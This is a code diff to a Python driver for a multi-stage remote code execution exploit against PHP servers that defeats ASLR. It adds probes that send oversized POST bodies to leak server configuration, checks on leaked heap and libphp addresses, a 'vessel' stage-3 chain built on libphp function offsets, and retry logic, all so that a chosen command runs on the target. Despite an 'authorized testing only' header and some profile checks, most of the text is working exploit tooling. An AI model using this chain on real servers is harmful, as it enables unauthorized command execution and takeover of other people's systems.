@@ -23,7 +23,8 @@ Authorized testing only.
 
 from __future__ import annotations
 from php2shell_paths import default_repo_dir
-from php2shell_upstream import patch_params, patch_tls
+from php2shell_upstream import patch_cookie_decode, patch_params, patch_tls
+from php2shell_vessel import pads_to_spec
 
 import argparse
 import glob
@@ -253,6 +254,20 @@ def oom_for(limit: int, profile: dict) -> int:
     return limit + 12
 
 
+# A correct leak is an mmap'd mapping: 0x7f... on amd64, 0xffff... on aarch64.
+# Anything below 1 TiB is a small integer or an un-relocated offset that the
+# upstream range filter accepts but that silently corrupts every later stage.
+MIN_MMAP_ADDR = 0x10000000000
+
+
+def implausible_leak(sink: dict) -> str | None:
+    """The leaked value, when it cannot be a real heap/module mapping."""
+    value = sink.get("chunk_base") or sink.get("libphp_base")
+    if value is not None and 0 < value < MIN_MMAP_ADDR:
+        return hex(value)
+    return None
+
+
 # ---------------------------------------------------------------------------
 # proof/fetch resolution
 # ---------------------------------------------------------------------------
@@ -400,16 +415,51 @@ class WorkerPins:
                 pass
 
 
-def probe_memory_limit(args, ui: UI) -> int | None:
-    """One-shot OOM probe: the fatal message reveals the target memory_limit."""
+def parse_probe_response(data: bytes) -> dict:
+    """Read the target configuration out of one probe response.
+
+    Request-startup diagnostics only render with display_errors=On, which is
+    exactly the mode the stage-1 leak needs: the OOM fatal reveals
+    memory_limit, the body-size warning reveals post_max_size, and either
+    message doubles as proof that diagnostics are rendered at all.
+    """
+    out = {"memory_limit": None, "post_max_size": None,
+           "diagnostics": False, "rejected": False}
+    m = re.search(rb"Allowed memory size of (\d+) bytes", data)
+    if m:
+        out["memory_limit"] = max(1, int(m.group(1)) // (1024 * 1024))
+        out["diagnostics"] = True
+        return out
+    m = re.search(rb"exceeds the limit of (\d+) bytes", data)
+    if m:
+        out["post_max_size"] = int(m.group(1))
+        out["diagnostics"] = True
+        return out
+    if b"413" in data.split(b"\r\n", 1)[0] or b"Request Entity Too Large" in data:
+        out["rejected"] = True
+        return out
+    for needle in (b"Fatal error:", b"Warning:", b"Deprecated:"):
+        if needle in data:
+            out["diagnostics"] = True
+            break
+    return out
+
+
+def probe_config(args, ui: UI) -> dict:
+    """One-shot configuration probe with the same oversized POSTs that used to
+    only reveal memory_limit. The responses additionally reveal post_max_size
+    (a value smaller than the OOM body silently blocks the whole chain) and
+    whether request-startup diagnostics are rendered (display_errors)."""
     u = urllib.parse.urlsplit(args.target if "://" in args.target else "http://" + args.target)
     host = u.hostname or ""
     port = u.port or (443 if u.scheme == "https" else 80)
     path = u.path or "/"
     import ssl
+    result = {"memory_limit": None, "post_max_size": None, "display_errors": None}
+    rejected = False
     for mb in (16, 64, 256):
         body = b"big=" + b"A" * (mb * 1024 * 1024)
-        ui.stage("PROBE", f"memory_limit probe: {mb} MiB body")
+        ui.stage("PROBE", f"config probe: {mb} MiB body")
         try:
             s = socket.create_connection((host, port), timeout=30)
             if u.scheme == "https":
@@ -429,19 +479,44 @@ def probe_memory_limit(args, ui: UI) -> int | None:
                 data += chunk
             s.close()
         except OSError:
-            return None
-        m = re.search(rb"Allowed memory size of (\d+) bytes", data)
+            break
+        parsed = parse_probe_response(data)
+        if parsed["diagnostics"]:
+            result["display_errors"] = True
+        if parsed["memory_limit"]:
+            result["memory_limit"] = parsed["memory_limit"]
+            break
+        if parsed["post_max_size"]:
+            result["post_max_size"] = parsed["post_max_size"]
+            break
+        if parsed["rejected"]:
+            rejected = True
+            break
+    if result["memory_limit"]:
+        ui.ok(f"detected memory_limit={result['memory_limit']}M")
+    if result["post_max_size"]:
+        ui.ok(f"detected post_max_size={result['post_max_size'] // (1024 * 1024)}M")
+    if result["display_errors"]:
+        ui.ok("display_errors=On (request-startup diagnostics are rendered)")
+    elif rejected:
+        ui.warn("body rejected by the server (413); target config unknown")
+    else:
+        ui.warn("no request-startup diagnostics seen; display_errors may be Off "
+                "(stage 1 depends on it)")
+    return result
+
+
+def _capture_leaks(text: str, sink: dict) -> None:
+    """Collect the leaked bases from upstream output lines."""
+    for key, label in (("chunk_base", "chunk base"), ("libphp_base", "libphp base")):
+        m = re.search(label + r" = (0x[0-9a-fA-F]+)", text)
         if m:
-            limit = max(1, int(m.group(1)) // (1024 * 1024))
-            ui.ok(f"detected memory_limit={limit}M")
-            return limit
-        if b"413" in data.split(b"\r\n", 1)[0] or b"Request Entity Too Large" in data:
-            ui.warn("body rejected by the server; cannot probe the memory limit")
-            return None
-    return None
+            sink[key] = int(m.group(1), 16)
 
 
-def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True) -> int:
+def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True,
+                 sink: dict | None = None) -> int:
+    """Run the upstream exploit; sink (optional) collects the leaked bases."""
     repo = args.repo_dir
     if not os.path.isfile(os.path.join(repo, "exploit.py")):
         ui.crit(f"{repo}/exploit.py not found; clone 9bie/php2shell-bypass-aslr-exp")
@@ -450,6 +525,12 @@ def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True) -> 
     if not lib.get("zif_system") or not lib.get("zval_ptr_dtor"):
         ui.crit("profile has no libphp offsets")
         return 3
+    stages = profile.get("stages") or {}
+    if stages.get("stage3_mode") == "vessel":
+        if not lib.get("htdata"):
+            ui.crit("vessel profile has no htdata offset")
+            return 3
+        return run_vessel(args, profile, proof, huge_mb, ui, stream, sink)
     cmd = [sys.executable, os.path.join(repo, "exploit.py"),
            "-u", args.target, "-c", args.command,
            "--profile", profile.get("upstream_profile", "bookworm"),
@@ -478,7 +559,6 @@ def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True) -> 
         return 0
 
     env = os.environ.copy()
-    stages = profile.get("stages") or {}
     for key, env_key in (("stage1_n", "P2S_STAGE1_N"),
                          ("stage1_forge_len", "P2S_FORGE_LEN"),
                          ("stage2_t", "P2S_STAGE2_T"),
@@ -486,8 +566,64 @@ def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True) -> 
         if stages.get(key) is not None:
             env[env_key] = str(stages[key])
 
+    return _run_exploit_cmd(cmd, ui, stream, sink, env)
+
+
+def run_vessel(args, profile, proof, huge_mb, ui: UI, stream: bool = True,
+               sink: dict | None = None) -> int:
+    """Run the vessel stage-3 chain (early-8.5 layouts).
+
+    Same leaks as upstream; stage 3 steers the dangling reference onto B2's
+    blob page instead of landing a carrier string on it
+    (tools/php2shell_vessel.py has the technique).
+    """
+    lib = profile.get("libphp") or {}
+    stages = profile.get("stages") or {}
+    cmd = [sys.executable, os.path.join(HERE, "php2shell_vessel.py"),
+           "-u", args.target, "-c", args.command,
+           "--proof-file", proof,
+           "--zif-offset", str(lib["zif_system"]),
+           "--dtor-offset", str(lib["zval_ptr_dtor"]),
+           "--htdata-offset", str(lib["htdata"])]
+    for key, arg in (("stage1_n", "--stage1-n"),
+                     ("stage1_forge_len", "--forge-len"),
+                     ("stage2_t", "--stage2-t"),
+                     ("stage2_v", "--stage2-v"),
+                     ("stage3_early", "--early"),
+                     ("stage3_blobs", "--blobs"),
+                     ("stage3_vessel_index", "--vessel-index")):
+        if stages.get(key) is not None:
+            cmd += [arg, str(stages[key])]
+    if stages.get("stage3_pads"):
+        cmd += ["--pad", pads_to_spec(stages["stage3_pads"])]
+    if args.fetch:
+        cmd += ["--fetch", args.fetch]
+    if huge_mb:
+        cmd += ["--huge-mb", str(huge_mb)]
+    if args.retries is not None:
+        cmd += ["--retries", str(args.retries)]
+    if args.no_pre_rotate:
+        cmd += ["--no-pre-rotate"]
+    if args.no_retry_rotate:
+        cmd += ["--no-retry-rotate"]
+    if args.allow_remote:
+        cmd += ["--allow-remote"]
+    if args.insecure:
+        cmd += ["--insecure"]
+
+    if args.dry_run:
+        ui.command(cmd)
+        return 0
+    return _run_exploit_cmd(cmd, ui, stream, sink)
+
+
+def _run_exploit_cmd(cmd, ui: UI, stream: bool, sink: dict | None = None,
+                     env: dict | None = None) -> int:
+    """Stream an exploit subprocess, optionally collecting leaked bases."""
     if not stream:
         result = subprocess.run(cmd, capture_output=True, text=True, env=env)
+        if sink is not None:
+            _capture_leaks(result.stdout, sink)
         if result.returncode != 0:
             tail = (result.stdout + result.stderr).strip().splitlines()[-4:]
             for line in tail:
@@ -499,6 +635,8 @@ def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True) -> 
     assert proc.stdout is not None
     for line in proc.stdout:
         ui.upstream(line.rstrip())
+        if sink is not None:
+            _capture_leaks(line, sink)
     return proc.wait()
 
 
@@ -533,7 +671,7 @@ def main() -> int:
     ap.add_argument("--huge-mb", type=int, default=None,
                     help="explicit OOM field size in MiB")
     ap.add_argument("--no-probe", action="store_true",
-                    help="do not probe the memory limit; sweep instead")
+                    help="do not probe memory_limit/post_max_size/display_errors")
     ap.add_argument("--retries", type=int, default=None,
                     help="upstream attempts per stage (default 3; stage 3 uses +2)")
     ap.add_argument("--no-pre-rotate", action="store_true",
@@ -624,6 +762,9 @@ def main() -> int:
         ui.result(False, "NOT CONFIRMED", "PHP version not identified")
         return 3
     ui.ok(f"PHP {version}  ·  {server}")
+    if not powered:
+        ui.warn("no X-Powered-By header (expose_php=Off): the startup heap differs and "
+                "the profile's stage-3 pads were calibrated with expose_php=On")
 
     cls = classify(version)
     if not cls:
@@ -675,6 +816,9 @@ def main() -> int:
             ui.warn("refusing to run an RCE profile against a different build")
             profile = dict(profile)
             profile["rce"] = False
+            profile["_refusal"] = (f"no verified profile for PHP {version}; refusing to "
+                                   f"re-use the {profile['php_version']} RCE profile "
+                                   f"against a different build")
 
     target_distro = detect_distro(server)
     profile_distro = normalize_distro(profile.get("distro") or profile.get("name", ""))
@@ -699,19 +843,25 @@ def main() -> int:
         ui.warn("remote target without a fetch path; the command runs blind")
 
     if not profile.get("rce"):
-        ui.crit("profile has no verified RCE stage")
-        for key in ("status", "measured"):
-            if profile.get(key):
-                ui.info(f"{key}: {profile[key]}")
+        if profile.get("_refusal"):
+            ui.crit(profile["_refusal"])
+        else:
+            ui.crit("profile has no verified RCE stage")
+            for key in ("status", "measured"):
+                if profile.get(key):
+                    ui.info(f"{key}: {profile[key]}")
         if args.assess:
             tool = os.path.join(HERE, "php2shell_assess.py")
             if os.path.isfile(tool):
                 ui.stage("ASSESS", "running exposure/leak assessment")
                 return subprocess.call([sys.executable, tool, "--target", args.target])
-        ui.result(False, "NO VERIFIED RCE", profile.get("status", profile["name"]))
+        detail = (f"no verified profile for PHP {version}" if profile.get("_refusal")
+                  else profile.get("status", profile["name"]))
+        ui.result(False, "NO VERIFIED RCE", detail)
         return 2
 
     patch_params(args.repo_dir)
+    patch_cookie_decode(args.repo_dir)
     if args.insecure:
         patch_tls(args.repo_dir)
 
@@ -754,17 +904,36 @@ def main() -> int:
         ui.result(False, "COMMAND TOO LONG", args.command)
         return 4
 
+    detected = {"memory_limit": None, "post_max_size": None, "display_errors": None}
+    if not args.no_probe:
+        detected = probe_config(args, ui)
     if args.huge_mb:
         limits = [max(args.huge_mb - 12, 1)]
     elif args.memory_limit_mb:
         limits = [args.memory_limit_mb]
     elif args.no_auto_memory:
         limits = [8]
-    elif not args.no_probe:
-        detected = probe_memory_limit(args, ui)
-        limits = [detected] if detected else [8, 16, 32, 64, 128, 256, 512]
+    elif detected["memory_limit"]:
+        limits = [detected["memory_limit"]]
     else:
         limits = [8, 16, 32, 64, 128, 256, 512]
+
+    if detected.get("post_max_size"):
+        # The stage-1 body is memory_limit+12M; a smaller post_max_size makes
+        # PHP reject it before parsing (no OOM, no leak, no error). Drop the
+        # candidates it would block so the sweep never wastes a run on them.
+        post_mb = detected["post_max_size"] // (1024 * 1024)
+        feasible = [l for l in limits if oom_for(l, profile) <= post_mb]
+        dropped = [l for l in limits if oom_for(l, profile) > post_mb]
+        if dropped:
+            ui.warn(f"post_max_size={post_mb}M would reject the OOM bodies for {dropped}; skipped")
+        if not feasible:
+            ui.crit(f"post_max_size={post_mb}M rejects every candidate OOM body")
+            ui.info("the chain posts memory_limit+12M; a smaller post_max_size "
+                    "blocks the request before PHP parses it")
+            ui.result(False, "CONFIG BLOCKED", f"post_max_size={post_mb}M < required OOM body")
+            return 2
+        limits = feasible
 
     pins = None
     pin_total = 0
@@ -808,13 +977,29 @@ def main() -> int:
     rc = 1
     for limit in limits:
         huge = args.huge_mb if args.huge_mb else oom_for(int(limit), profile)
-        ui.stage("EXECUTE", f"memory_limit={limit}M  ·  huge_mb={huge}")
-        if proof and os.path.exists(proof):
-            try:
-                os.unlink(proof)
-            except OSError:
-                pass
-        rc = run_upstream(args, profile, proof, huge, ui)
+        # One retry per candidate: a failed run still evolves the worker heap,
+        # and a garbage stage-1 leak (see implausible_leak) only ever fails
+        # after every internal attempt has been wasted on it.
+        for attempt in (1, 2):
+            label = f"memory_limit={limit}M  ·  huge_mb={huge}"
+            if attempt > 1:
+                label += f"  ·  retry {attempt - 1}"
+            ui.stage("EXECUTE", label)
+            if proof and os.path.exists(proof):
+                try:
+                    os.unlink(proof)
+                except OSError:
+                    pass
+            sink = {}
+            rc = run_upstream(args, profile, proof, huge, ui, sink=sink)
+            if rc == 0 or args.dry_run:
+                break
+            bad = implausible_leak(sink)
+            if bad and attempt == 1:
+                ui.warn(f"stage 1 leaked {bad}, not a mapped heap address "
+                        "(layout drifted from the profile); retrying")
+                continue
+            break
         if rc == 0:
             break
         if not args.dry_run:
